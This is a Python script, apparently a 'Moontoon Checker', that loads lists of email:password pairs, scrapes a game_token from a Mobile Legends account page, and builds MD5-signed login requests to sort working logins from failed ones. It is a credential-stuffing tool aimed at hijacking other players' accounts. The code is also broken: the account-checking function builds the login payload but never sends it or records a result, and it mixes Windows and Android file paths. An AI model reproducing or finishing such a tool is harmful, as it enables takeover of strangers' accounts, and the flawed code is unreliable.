import httpx
import hashlib
import json
import time
import pyfiglet
import re
import atexit
import os
from datetime import datetime

class colors:
    reset = "\033[0m"
    green = "\033[32m"
    yellow = "\033[33m"
    blue = "\033[34m"
    cyan = "\033[36m"
    red = "\033[31m"
    white = "\033[37m"
    bold = "\033[1m"
    b_red = "\33[91m"
    b_green = "\033[92m"
    b_magenta = "\033[95m"

current_datetime = datetime.now().strftime('%B %d, %Y - %I:%M %p')

def hash_md5(text: str) -> str:
    return hashlib.md5(text.encode('utf-8')).hexdigest()

def print_banner():
    ascii_banner = pyfiglet.figlet_format("Moontoon Checker", font="slant")
    print(f"{colors.cyan}{ascii_banner}{colors.reset}")

def exit_message():
    print(f"\n{colors.b_magenta}Program terminated. Thank you for using the Validity Checker!{colors.reset}")

atexit.register(exit_message)

def list_txt_files(directory):
    txt_files = []
    for root, dirs, files in os.walk(directory):
        for file in files:
            if file.endswith('.txt'):
                txt_files.append(os.path.join(root, file))
    return sorted(txt_files)

def get_file_selection(txt_files):
    print(f"{colors.cyan}Available txt files:{colors.reset}")
    for index, filepath in enumerate(txt_files, start=1):
        filename = os.path.basename(filepath)
        print(f"{index}. {filename}")

    selected_files = input("[?] Enter the numbers of the files to check (comma-separated): ")
    selected_indices = [int(num) - 1 for num in selected_files.split(',') if num.isdigit() and 0 < int(num) <= len(txt_files)]
    return [txt_files[i] for i in selected_indices]

def load_file(filepath):
    with open(filepath, 'r') as file:
        lines = file.readlines()

    if not lines:
        print(f"{colors.red}Error: The file is empty! Please try again.{colors.reset}")
        return []

    return lines

def get_game_token():
    # First make a request to get the initial page
    headers = {
        'Accept': '*/*',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
    }
    
    try:
        # Make request to initial page to get game_token
        response = httpx.get('https://mtacc.mobilelegends.com/v2.1/', headers=headers)
        
        # Look for game_token in response
        match = re.search(r'game_token\s*:\s*["\']([^"\']+)["\']', response.text)
        if match:
            return match.group(1)
        
        # Fallback to checking localStorage
        match = re.search(r'localStorage\.setItem\(["\']game_token["\']\s*,\s*["\']([^"\']+)["\']', response.text)
        if match:
            return match.group(1)
            
    except Exception as e:
        print(f"{colors.red}[ERROR] Failed to get game_token: {str(e)}{colors.reset}")
    
    return ''

def check_account(line, successful_creds, error_creds, success_count, incorrect_password_count, no_account_count, other_count, invalid_format_count):
    # Get game_token first
    game_token = get_game_token()
    
    line = line.strip()
    if not line or not re.match(r"^[^:|]+[:|].+$", line):
        print(f"{colors.yellow}[𝙸𝙽𝚅𝙰𝙻𝙸𝙳] - Invalid format: {line}{colors.reset}")
        invalid_format_count[0] += 1
        return

    try:
        username, password = re.split("[:|]", line, maxsplit=1)
    except ValueError:
        print(f"{colors.yellow}[𝙸𝙽𝚅𝙰𝙻𝙸𝙳] - Invalid format: {line}{colors.reset}")
        invalid_format_count[0] += 1
        return

    # Generate proper sign with game_token
    md5_password = hash_md5(password.strip()) 
    sign = hash_md5(username.strip() + md5_password + game_token)

    json_data = {
        'op': 'login',
        'sign': sign,
        'params': {
            'account': username.strip(),
            'md5pwd': md5_password,
            'game_token': game_token,
            'recaptcha_token': '',
            'country': '',
        },
        'lang': 'en',
    }

def main():
    print_banner()
    print(f'{colors.yellow}[!] We accept EMAIL:PASS format.{colors.reset}')

    directory = 'C:/Users/chris/Downloads'
    output_valid = '/storage/emulated/0/MLA/𝚅𝙰𝙻𝙸𝙳/'
    output_errors = '/storage/emulated/0/MLA/𝙴𝚁𝚁𝙾𝚁𝚂/'

    os.makedirs(output_valid, exist_ok=True)
    os.makedirs(output_errors, exist_ok=True)

    txt_files = list_txt_files(directory)

    if not txt_files:
        print(f"{colors.red}No .txt files found in the specified directory!{colors.reset}")
        return

    selected_files = get_file_selection(txt_files)

    successful_creds = []
    error_creds = []
    success_count = [0]
    incorrect_password_count = [0]
    no_account_count = [0]
    other_count = [0]
    invalid_format_count = [0]

    counter = 1

    for filepath in selected_files:
        lines = load_file(filepath)

        valid_name = f'𝚅𝙰𝙻𝙸𝙳𝙸𝚃𝚈 𝙲𝙷𝙴𝙲𝙺𝙴𝙳 - {counter}.txt'
        error_name = f'𝙴𝚁𝚁𝙾𝚁 𝙰𝙲𝙲𝙾𝚄𝙽𝚃 - {counter}.txt'
        successful_file = os.path.join(output_valid, valid_name)
        error_file = os.path.join(output_errors, error_name)

        total_accounts = len(lines)
        print(f"{colors.cyan}𝚂𝚃𝙰𝚁𝚃𝙸𝙽𝙶 𝙲𝙷𝙴𝙲𝙺𝙸𝙽𝙶 𝙵𝙾𝚁 {total_accounts} 𝙰𝙲𝙲𝙾𝚄𝙽𝚃𝚂 𝙸𝙽 {os.path.basename(filepath)}...{colors.reset}")
        time.sleep(2)

        for index, line in enumerate(lines, start=1):
            check_account(line, successful_creds, error_creds, success_count, incorrect_password_count, no_account_count, other_count, invalid_format_count)

        if successful_creds:
            with open(successful_file, 'w') as output_file:
                output_file.write('\n'.join(successful_creds) + '\n')
            print(f"{colors.green}\n𝚁𝙴𝚂𝚄𝙻𝚃𝚂 𝚂𝚄𝙲𝙲𝙴𝚂𝚂𝙵𝚄𝙻𝙻𝚈 𝚂𝙰𝚅𝙴𝙳 𝚃𝙾 {successful_file}{colors.reset}")
        else:
            print(f"{colors.red}No successful logins found, nothing saved{colors.reset}")

        if error_creds:
            with open(error_file, 'w') as error_output_file:
                error_output_file.write('\n'.join(error_creds))
            print(f"{colors.red}Errors saved successfully to {error_file}{colors.reset}")
        else:
            print(f"{colors.green}No errors found, nothing saved to the error file{colors.reset}")

        print(f"\n𝙵𝙸𝙽𝙰𝙻 𝚂𝚄𝙼𝙼𝙰𝚁𝚈 𝙵𝙾𝚁 {colors.cyan}{os.path.basename(filepath)}{colors.reset}")
        print(f"𝚃𝙾𝚃𝙰𝙻 𝙰𝙲𝙲𝙾𝚄𝙽𝚃 𝙲𝙷𝙴𝙲𝙺𝙴𝙳: {colors.white}{total_accounts}{colors.reset}")
        print(f"𝚅𝙰𝙻𝙸𝙳 𝙰𝙲𝙲𝙾𝚄𝙽𝚃𝚂: {colors.green}{success_count[0]}{colors.reset}")
        print(f"𝙸𝙽𝙲𝙾𝚁𝚁𝙴𝙲𝚃 𝙿𝙰𝚂𝚂𝚆𝙾𝚁𝙳𝚂: {colors.red}{incorrect_password_count[0]}{colors.reset}")
        print(f"𝙸𝙽𝚅𝙰𝙻𝙸𝙳 𝙵𝙾𝚁𝙼𝙰𝚃𝚂: {colors.yellow}{invalid_format_count[0]}{colors.reset}")
        print(f"𝙽𝙾𝙽 𝙴𝚇𝙸𝚂𝚃𝙴𝙽𝚃 𝙰𝙲𝙲𝙾𝚄𝙽𝚃𝚂: {colors.yellow}{no_account_count[0]}{colors.reset}")
        print(f"𝙴𝚁𝚁𝙾𝚁𝚂: {colors.red}{other_count[0]}{colors.reset}")
        print(f"{time.strftime('[%Y-%m-%d %I:%M:%S %p]')}")

if __name__ == "__main__":
    main()
